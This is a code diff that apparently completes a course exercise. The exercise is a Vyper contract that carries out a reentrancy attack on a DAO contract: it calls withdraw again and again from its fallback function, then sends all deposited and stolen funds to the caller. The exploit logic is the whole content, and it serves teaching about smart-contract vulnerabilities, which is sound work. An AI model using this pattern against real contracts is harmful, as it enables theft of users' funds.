@@ -17,9 +17,9 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-
+    if self.dao_address.balance >= DAO(self.dao_address).userBalances(self):
     #T Withdraw from Dao
-    DAO(self.dao_address).withdraw()
+        DAO(self.dao_address).withdraw()
     return True
 
 @external
@@ -37,6 +37,7 @@ def attack(dao_address:address):
     # TODO: Start the reentrancy attack
     self._attack()
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
+    send(msg.sender, self.balance)
 
     pass
 
@@ -48,8 +49,8 @@ def __default__():
     # TODO: Add code here to complete the recursive call
 
     #T I need to withdraw here. this is the 'fallback function'
-    if self.dao_address.balance >= 1:
+    #if dao_address.balance >= 1:
+    if msg.sender == self.dao_address:
         self._attack()
-        #DAO(self.dao_address).withdraw()
 
     pass
